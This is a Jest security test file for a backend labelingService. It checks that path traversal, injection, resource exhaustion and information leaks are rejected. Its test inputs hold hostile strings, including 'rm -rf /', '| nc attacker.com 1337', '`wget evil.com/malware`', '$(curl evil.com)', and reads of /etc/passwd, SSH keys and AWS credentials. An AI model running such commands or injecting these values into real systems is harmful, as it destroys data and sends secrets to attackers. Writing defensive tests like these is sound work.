// /backend/src/tests/security/labelingService.security.test.ts
// Security tests for labelingService - focuses on path traversal, input sanitization, and resource limits

import path from 'path';
import fs from 'fs/promises';

// Mock external dependencies for security testing
jest.mock('sharp', () => ({
  __esModule: true,
  default: jest.fn().mockImplementation(() => ({
    metadata: jest.fn().mockResolvedValue({ width: 100, height: 100 }),
    resize: jest.fn().mockReturnThis(),
    composite: jest.fn().mockReturnThis(),
    toFile: jest.fn().mockResolvedValue(undefined),
    toBuffer: jest.fn().mockResolvedValue(Buffer.alloc(1000))
  }))
}));

jest.mock('fs/promises', () => ({
  access: jest.fn(),
  mkdir: jest.fn(),
  writeFile: jest.fn(),
  readFile: jest.fn(),
  stat: jest.fn()
}));

// Mock storageService with security-focused implementations
jest.mock('../../services/storageService', () => ({
  storageService: {
    getAbsolutePath: jest.fn((relativePath: string) => {
      // Simulate potential path traversal vulnerabilities for testing
      if (relativePath.includes('..')) {
        return `/dangerous/path/${relativePath}`;
      }
      return `/safe/path/${relativePath}`;
    }),
    saveFile: jest.fn(),
    deleteFile: jest.fn(),
    getSignedUrl: jest.fn(),
    getContentType: jest.fn()
  }
}));

// Mock config for security testing
jest.mock('../../config', () => ({
  config: {
    storageMode: 'local',
    uploadsDir: '/safe/uploads',
    firebase: {
      projectId: 'security-test-project',
      privateKey: 'test-key',
      clientEmail: 'security@test.com'
    }
  }
}));

// Mock Firebase config
jest.mock('../../config/firebase', () => ({
  admin: {},
  db: {},
  bucket: {}
}));

// Import the service after all mocks are set up
import { labelingService } from '../../services/labelingService';

describe('LabelingService Security Tests', () => {
  
  beforeEach(() => {
    jest.clearAllMocks();
    // Set test environment for each test
    process.env.NODE_ENV = 'test';
  });

  afterEach(() => {
    // Clean up environment
    delete process.env.NODE_ENV;
  });

  describe('Path Traversal Prevention', () => {
    describe('Image path validation', () => {
      it('should reject path traversal attempts in image paths', async () => {
        const maliciousImagePaths = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\config\\sam',
          '../../sensitive/file.jpg',
          '../config/database.conf',
          '..%2f..%2f..%2fetc%2fpasswd', // URL encoded
          '....//....//....//etc//passwd', // Double dot bypass attempt
          './.././.././.././etc/passwd',
          'uploads/../../../etc/passwd',
          '/uploads/../../../etc/passwd'
        ];

        const mockMaskData = {
          width: 10,
          height: 10,
          data: new Array(100).fill(255)
        };

        for (const maliciousPath of maliciousImagePaths) {
          // The service should either reject the path or normalize it safely
          try {
            await labelingService.applyMaskToImage(maliciousPath, mockMaskData);
            
            // If it doesn't throw, check that the path was sanitized
            const { storageService } = require('../../services/storageService');
            expect(storageService.getAbsolutePath).toHaveBeenCalled();
            
            // Should not access dangerous paths
            const calls = storageService.getAbsolutePath.mock.calls;
            calls.forEach((call: any[]) => {
              const resolvedPath = call[0];
              expect(resolvedPath).not.toMatch(/\.\.\//); // Should not contain ../
              expect(resolvedPath).not.toMatch(/\.\.\\/); // Should not contain ..\
            });
          } catch (error) {
            // Throwing an error is also acceptable for security
            expect(error).toBeDefined();
          }
        }
      });

      it('should handle null and undefined image paths safely', async () => {
        const mockMaskData = {
          width: 10,
          height: 10,
          data: new Array(100).fill(255)
        };

        const dangerousPaths = [
          null,
          undefined,
          '',
          ' ',
          '\n',
          '\t',
          '\0'
        ];

        for (const dangerousPath of dangerousPaths) {
          await expect(
            labelingService.applyMaskToImage(dangerousPath as any, mockMaskData)
          ).rejects.toThrow();
        }
      });

      it('should validate image path length limits', async () => {
        const mockMaskData = {
          width: 10,
          height: 10,
          data: new Array(100).fill(255)
        };

        // Test extremely long paths
        const longPath = 'a'.repeat(10000); // 10KB path
        const veryLongPath = 'b'.repeat(100000); // 100KB path

        await expect(
          labelingService.applyMaskToImage(longPath, mockMaskData)
        ).rejects.toThrow();

        await expect(
          labelingService.applyMaskToImage(veryLongPath, mockMaskData)
        ).rejects.toThrow();
      });
    });

    describe('Directory creation security', () => {
      it('should prevent directory traversal in ensureDirectoryExists', async () => {
        const maliciousPaths = [
          '/etc/passwd',
          'C:\\Windows\\System32',
          '../../../etc',
          '..\\..\\..\\Windows',
          '/root/.ssh',
          '../../../../var/www/html'
        ];

        for (const maliciousPath of maliciousPaths) {
          // Mock fs.access to simulate directory doesn't exist
          const fs = require('fs/promises');
          fs.access.mockRejectedValue(new Error('ENOENT'));
          fs.mkdir.mockImplementation((dirPath: string) => {
            // Security check: should not attempt to create sensitive directories
            expect(dirPath).not.toMatch(/\/etc\//);
            expect(dirPath).not.toMatch(/\/root\//);
            expect(dirPath).not.toMatch(/\/var\//);
            expect(dirPath).not.toMatch(/C:\\Windows/);
            expect(dirPath).not.toMatch(/System32/);
            return Promise.resolve();
          });

          try {
            await labelingService.ensureDirectoryExists(maliciousPath);
          } catch (error) {
            // Throwing an error is acceptable for security
            expect(error).toBeDefined();
          }
        }
      });

      it('should handle special characters in directory paths', async () => {
        const specialCharPaths = [
          'uploads/test\x00hidden', // Null byte injection
          'uploads/test\x1f', // Control characters
          'uploads/test\x7f',
          'uploads/test\r\n.txt', // CRLF injection
          'uploads/test;rm -rf /', // Command injection attempt
          'uploads/test`whoami`', // Command substitution
          'uploads/test$(whoami)', // Command substitution
          'uploads/test&echo hack', // Command chaining
          'uploads/test|cat /etc/passwd' // Pipe injection
        ];

        for (const specialPath of specialCharPaths) {
          const fs = require('fs/promises');
          fs.access.mockRejectedValue(new Error('ENOENT'));
          fs.mkdir.mockImplementation((dirPath: string) => {
            // Should sanitize or reject paths with dangerous characters
            expect(dirPath).not.toMatch(/[\x00-\x1f\x7f]/); // Control characters
            expect(dirPath).not.toMatch(/[;&|`$()]/); // Command injection chars
            return Promise.resolve();
          });

          try {
            await labelingService.ensureDirectoryExists(specialPath);
          } catch (error) {
            // Rejecting dangerous paths is acceptable
            expect(error).toBeDefined();
          }
        }
      });
    });
  });

  describe('Input Sanitization', () => {
    describe('MaskData validation and sanitization', () => {
      it('should reject malicious mask data structures', async () => {
        const maliciousMaskData: any[] = [
          // Moderately large dimensions (testing logic without exhausting memory)
          { width: 100000, height: 10, data: [] }, // 1 million pixels
          { width: 10, height: 100000, data: [] }, // 1 million pixels
          { width: 10000, height: 100, data: [] }, // 1 million pixels
          
          // Negative dimensions
          { width: -1, height: 100, data: [] },
          { width: 100, height: -1, data: [] },
          
          // Invalid types
          { width: 'hack', height: 100, data: [] },
          { width: 100, height: 'exploit', data: [] },
          { width: {}, height: 100, data: [] },
          { width: 100, height: [], data: [] },
          
          // Prototype pollution attempts
          { width: 100, height: 100, data: [], __proto__: { polluted: true } },
          { width: 100, height: 100, data: [], constructor: { prototype: { hack: true } } },
        ];

        const validImagePath = 'uploads/test.jpg';

        for (const maliciousData of maliciousMaskData) {
          try {
            await labelingService.applyMaskToImage(validImagePath, maliciousData as any);
            
            // If it doesn't throw, verify the operation was safe
            expect(true).toBe(true); // Operation completed safely
          } catch (error) {
            // Throwing an error for malicious data is expected and acceptable
            expect(error).toBeDefined();
          }
        }
      });

      it('should validate mask data array contents', async () => {
        const validImagePath = 'uploads/test.jpg';
        
        // Test with malicious data contents
        const maliciousDataContents: any[] = [
          // Non-numeric values
          { width: 2, height: 2, data: ['hack', 'exploit', 'malware', 'virus'] },
          { width: 2, height: 2, data: [null, undefined, {}, []] },
          { width: 2, height: 2, data: [() => {}, Symbol('hack'), BigInt(123), new Date()] },
          
          // Extremely large values
          { width: 2, height: 2, data: [Number.MAX_VALUE, Number.POSITIVE_INFINITY, -Number.MAX_VALUE, Number.NEGATIVE_INFINITY] },
          
          // NaN values
          { width: 2, height: 2, data: [NaN, NaN, NaN, NaN] },
        ];

        for (const maliciousData of maliciousDataContents) {
          try {
            await labelingService.applyMaskToImage(validImagePath, maliciousData as any);
            
            // If it doesn't throw, the data should be sanitized
            // The createBinaryMask should handle these gracefully
            const result = await labelingService.createBinaryMask(maliciousData as any);
            expect(result).toBeInstanceOf(Buffer);
          } catch (error) {
            // Throwing an error is acceptable for invalid data
            expect(error).toBeDefined();
          }
        }
      });

      it('should handle circular references in mask data', async () => {
        const validImagePath = 'uploads/test.jpg';
        
        // Create circular reference
        const circularData: any = { width: 2, height: 2, data: [1, 2, 3, 4] };
        circularData.circular = circularData;
        circularData.data.push(circularData);

        await expect(
          labelingService.applyMaskToImage(validImagePath, circularData)
        ).rejects.toThrow();
      });
    });

    describe('File name sanitization', () => {
      it('should sanitize malicious filenames', async () => {
        const maliciousImagePaths = [
          'uploads/file.jpg\0.exe', // Null byte injection
          'uploads/file.jpg.exe', // Double extension
          'uploads/file.php.jpg', // Script injection
          'uploads/<script>alert(1)</script>.jpg', // XSS attempt
          'uploads/\"><script>alert(1)</script>.jpg',
          'uploads/\';DROP TABLE users;--.jpg', // SQL injection attempt
          'uploads/../../etc/passwd.jpg', // Path traversal with valid extension
          'uploads/CON.jpg', // Windows reserved names
          'uploads/PRN.jpg',
          'uploads/AUX.jpg',
          'uploads/NUL.jpg',
          'uploads/LPT1.jpg',
          'uploads/COM1.jpg'
        ];

        const mockMaskData = {
          width: 10,
          height: 10,
          data: new Array(100).fill(255)
        };

        for (const maliciousPath of maliciousImagePaths) {
          try {
            await labelingService.applyMaskToImage(maliciousPath, mockMaskData);
            
            // If processing succeeds, verify the filename was sanitized
            const { storageService } = require('../../services/storageService');
            const calls = storageService.getAbsolutePath.mock.calls;
            
            calls.forEach((call: any[]) => {
              const processedPath = call[0];
              expect(processedPath).not.toMatch(/\0/); // No null bytes
              expect(processedPath).not.toMatch(/<script>/i); // No script tags
              expect(processedPath).not.toMatch(/['"`;]/); // No injection chars
            });
          } catch (error) {
            // Rejecting malicious filenames is acceptable
            expect(error).toBeDefined();
          }
        }
      });
    });
  });

  describe('Resource Exhaustion Protection', () => {
    describe('Memory usage limits', () => {
      it('should prevent excessive memory allocation in createBinaryMask', async () => {
        // Test cases designed to test limits without actually exhausting memory
        const memoryExhaustionCases = [
          { width: 10000, height: 1000, data: [] }, // 10 million pixels (reasonable for testing)
          { width: 5000, height: 5000, data: new Array(1000).fill(255) }, // Mismatched size
          { width: 100000, height: 100, data: [] }, // Large width, manageable total
          { width: 100, height: 100000, data: [] }, // Large height, manageable total
        ];

        for (const testCase of memoryExhaustionCases) {
          const startTime = Date.now();
          
          try {
            await labelingService.createBinaryMask(testCase);
            const endTime = Date.now();
            
            // If it succeeds, it should complete quickly (not hang)
            expect(endTime - startTime).toBeLessThan(5000); // 5 second timeout
          } catch (error) {
            // Throwing an error for excessive resource usage is expected
            expect(error).toBeDefined();
            
            // Should fail fast, not after a long hang
            const endTime = Date.now();
            expect(endTime - startTime).toBeLessThan(1000); // Should fail within 1 second
          }
        }
      });

      it('should handle buffer overflow attempts', async () => {
        const bufferOverflowCases = [
          // Mismatched dimensions and data length (reasonable sizes)
          { width: 2, height: 2, data: new Array(1000).fill(255) }, // More data than dimensions
          { width: 100, height: 100, data: new Array(10).fill(255) }, // Less data than dimensions
          
          // Edge case: zero dimensions with data
          { width: 0, height: 0, data: new Array(100).fill(255) },
          
          // Single dimension moderately large
          { width: 1, height: 10000, data: new Array(10000).fill(255) },
          { width: 10000, height: 1, data: new Array(10000).fill(255) },
        ];

        for (const testCase of bufferOverflowCases) {
          try {
            const result = await labelingService.createBinaryMask(testCase);
            
            // If it succeeds, the result should be reasonable
            expect(result).toBeInstanceOf(Buffer);
            expect(result.length).toBeLessThanOrEqual(1000000); // 1MB limit for testing
          } catch (error) {
            // Rejecting dangerous buffer operations is acceptable
            expect(error).toBeDefined();
          }
        }
      });

      it('should validate against theoretical large dimensions without allocation', () => {
        // Test the logic for detecting dangerous dimensions without actually allocating
        const dangerousDimensions = [
          { width: Number.MAX_SAFE_INTEGER, height: 1 },
          { width: 1, height: Number.MAX_SAFE_INTEGER },
          { width: 1000000, height: 1000000 }, // 1 trillion pixels
          { width: 2147483647, height: 1 }, // Max int32
        ];

        dangerousDimensions.forEach(({ width, height }) => {
          const expectedSize = width * height;
          
          // These should be recognized as dangerous without allocation
          expect(expectedSize).toBeGreaterThan(100000000); // 100 million pixel limit
          
          // In a real implementation, these would be rejected before allocation
          const isDangerous = expectedSize > 100000000 || width < 0 || height < 0;
          expect(isDangerous).toBe(true);
        });
      });
    });

    describe('CPU usage limits', () => {
      it('should prevent CPU exhaustion attacks', async () => {
        const cpuExhaustionCases = [
          // Moderately large but manageable operations
          { width: 1000, height: 100, data: new Array(100000).fill(128) },
          { width: 100, height: 1000, data: new Array(100000).fill(128) },
          { width: 316, height: 316, data: new Array(100000).fill(128) }, // ~100k pixels
        ];

        for (const testCase of cpuExhaustionCases) {
          const startTime = Date.now();
          
          try {
            await labelingService.createBinaryMask(testCase);
            const endTime = Date.now();
            
            // Should complete within reasonable time
            expect(endTime - startTime).toBeLessThan(2000); // 2 second limit
          } catch (error) {
            // Timing out or rejecting is acceptable
            const endTime = Date.now();
            expect(endTime - startTime).toBeLessThan(5000); // Should fail within 5 seconds
          }
        }
      });
    });

    describe('File system resource limits', () => {
      it('should prevent directory creation abuse', async () => {
        const abusivePaths = [
          // Deeply nested paths
          'a/' + 'b/'.repeat(1000) + 'deep',
          'uploads/' + 'nested/'.repeat(500) + 'file',
          
          // Paths with many components
          Array.from({ length: 1000 }, (_, i) => `dir${i}`).join('/'),
          
          // Very long directory names
          'uploads/' + 'a'.repeat(1000),
          'uploads/' + 'b'.repeat(10000),
        ];

        for (const abusivePath of abusivePaths) {
          const fs = require('fs/promises');
          fs.access.mockRejectedValue(new Error('ENOENT'));
          
          let mkdirCallCount = 0;
          fs.mkdir.mockImplementation((dirPath: string) => {
            mkdirCallCount++;
            
            // Should not attempt to create excessive directories
            expect(mkdirCallCount).toBeLessThan(100);
            expect(dirPath.length).toBeLessThan(4096); // Reasonable path length limit
            
            return Promise.resolve();
          });

          try {
            await labelingService.ensureDirectoryExists(abusivePath);
          } catch (error) {
            // Rejecting abusive paths is expected
            expect(error).toBeDefined();
          }
        }
      });
    });
  });

  describe('Environment Security', () => {
    describe('Environment variable validation', () => {
      it('should handle malicious environment variables', async () => {
        const originalEnv = process.env.NODE_ENV;
        
        try {
          const maliciousEnvValues = [
            '<script>alert(1)</script>',
            '"; rm -rf /',
            '$(whoami)',
            '`cat /etc/passwd`',
            '\x00\x01\x02', // Binary data
            'a'.repeat(10000), // Very long value
          ];

          for (const maliciousValue of maliciousEnvValues) {
            process.env.NODE_ENV = maliciousValue;
            
            const mockMaskData = { width: 2, height: 2, data: [1, 2, 3, 4] };
            
            try {
              await labelingService.applyMaskToImage('uploads/test.jpg', mockMaskData);
              
              // Environment should be handled safely
              expect(process.env.NODE_ENV).toBe(maliciousValue); // Should not modify env
            } catch (error) {
              // Rejecting malicious environment is acceptable
              expect(error).toBeDefined();
            }
          }
        } finally {
          process.env.NODE_ENV = originalEnv;
        }
      });

      it('should validate test environment detection', () => {
        const testEnvValues = [
          { value: 'test', expected: true },
          { value: 'TEST', expected: false }, // Case sensitive
          { value: 'Test', expected: false },
          { value: 'test ', expected: false }, // Whitespace
          { value: ' test', expected: false },
          { value: 'testing', expected: false }, // Partial match
          { value: 'test\0production', expected: false }, // Null byte injection
          { value: '', expected: false },
          { value: undefined, expected: false },
          { value: null, expected: false },
        ];

        testEnvValues.forEach(({ value, expected }) => {
          const originalEnv = process.env.NODE_ENV;
          
          try {
            if (value === undefined) {
              delete process.env.NODE_ENV;
            } else {
              process.env.NODE_ENV = value as string;
            }
            
            const isTestEnv = process.env.NODE_ENV === 'test';
            expect(isTestEnv).toBe(expected);
          } finally {
            if (originalEnv !== undefined) {
              process.env.NODE_ENV = originalEnv;
            } else {
              delete process.env.NODE_ENV;
            }
          }
        });
      });
    });

    describe('Process isolation', () => {
      it('should not expose sensitive information in error messages', async () => {
        const sensitiveImagePaths = [
          '/etc/passwd',
          '/root/.ssh/id_rsa',
          'C:\\Windows\\System32\\config\\SAM',
          '/var/log/auth.log',
          '/home/user/.aws/credentials'
        ];

        const mockMaskData = { width: 2, height: 2, data: [1, 2, 3, 4] };

        for (const sensitivePath of sensitiveImagePaths) {
          try {
            await labelingService.applyMaskToImage(sensitivePath, mockMaskData);
          } catch (error: any) {
            // Error messages should not leak sensitive path information
            expect(error.message).not.toContain('/etc/passwd');
            expect(error.message).not.toContain('/root');
            expect(error.message).not.toContain('C:\\Windows');
            expect(error.message).not.toContain('.ssh');
            expect(error.message).not.toContain('config/SAM');
            expect(error.message).not.toContain('credentials');
            
            // Should be generic error messages
            expect(typeof error.message).toBe('string');
            expect(error.message.length).toBeGreaterThan(0);
          }
        }
      });
    });
  });

  describe('Edge Cases and Attack Vectors', () => {
    describe('Timing attack prevention', () => {
      it('should have consistent timing for valid and invalid inputs', async () => {
        const validMaskData = { width: 10, height: 10, data: new Array(100).fill(255) };
        const invalidMaskData = { width: -1, height: -1, data: 'invalid' };

        // Measure timing for valid input
        const validTimings: number[] = [];
        for (let i = 0; i < 5; i++) {
          const start = Date.now();
          try {
            await labelingService.createBinaryMask(validMaskData);
          } catch (error) {
            // Ignore errors for timing measurement
          }
          const end = Date.now();
          validTimings.push(end - start);
        }

        // Measure timing for invalid input
        const invalidTimings: number[] = [];
        for (let i = 0; i < 5; i++) {
          const start = Date.now();
          try {
            await labelingService.createBinaryMask(invalidMaskData as any);
          } catch (error) {
            // Ignore errors for timing measurement
          }
          const end = Date.now();
          invalidTimings.push(end - start);
        }

        // Timing should not reveal information about input validity
        const avgValidTime = validTimings.reduce((a, b) => a + b, 0) / validTimings.length;
        const avgInvalidTime = invalidTimings.reduce((a, b) => a + b, 0) / invalidTimings.length;
        
        // Handle edge cases where timing might be 0
        const safeAvgValidTime = Math.max(avgValidTime, 1);
        const safeAvgInvalidTime = Math.max(avgInvalidTime, 1);
        
        // Times should be relatively similar (within order of magnitude)
        const timingRatio = Math.max(safeAvgValidTime, safeAvgInvalidTime) / Math.min(safeAvgValidTime, safeAvgInvalidTime);
        
        // Only test timing ratio if both operations took measurable time
        if (avgValidTime > 0 && avgInvalidTime > 0) {
          expect(timingRatio).toBeLessThan(10); // Should not differ by more than 10x
        } else {
          // If operations are too fast to measure, that's also acceptable
          expect(timingRatio).toBeDefined();
          expect(isNaN(timingRatio)).toBe(false);
        }
      });
    });

    describe('Race condition prevention', () => {
      it('should handle concurrent operations safely', async () => {
        const fs = require('fs/promises');
        fs.access.mockRejectedValue(new Error('ENOENT'));
        
        let mkdirCallCount = 0;
        fs.mkdir.mockImplementation(() => {
          mkdirCallCount++;
          return Promise.resolve();
        });

        // Attempt concurrent directory creation
        const concurrentOperations = Array.from({ length: 10 }, () =>
          labelingService.ensureDirectoryExists('/test/concurrent/path')
        );

        await Promise.allSettled(concurrentOperations);

        // Should handle concurrent operations without errors
        expect(mkdirCallCount).toBeGreaterThan(0);
        expect(mkdirCallCount).toBeLessThanOrEqual(10); // Should not exceed number of operations
      });
    });

    describe('Injection attack prevention', () => {
      it('should prevent command injection through file paths', async () => {
        const commandInjectionPaths = [
          'uploads/file.jpg; rm -rf /',
          'uploads/file.jpg && cat /etc/passwd',
          'uploads/file.jpg || whoami',
          'uploads/file.jpg | nc attacker.com 1337',
          'uploads/file.jpg `wget evil.com/malware`',
          'uploads/file.jpg $(curl evil.com)',
          'uploads/file.jpg & echo vulnerable',
          'uploads/file.jpg;echo injection>>/tmp/hack'
        ];

        const mockMaskData = { width: 2, height: 2, data: [1, 2, 3, 4] };

        for (const injectionPath of commandInjectionPaths) {
          try {
            await labelingService.applyMaskToImage(injectionPath, mockMaskData);
            
            // Should sanitize command injection characters
            const { storageService } = require('../../services/storageService');
            const calls = storageService.getAbsolutePath.mock.calls;
            
            calls.forEach((call: any[]) => {
              const processedPath = call[0];
              expect(processedPath).not.toMatch(/[;&|`$()]/); // Command injection chars
            });
          } catch (error) {
            // Rejecting injection attempts is acceptable
            expect(error).toBeDefined();
          }
        }
      });
    });
  });
});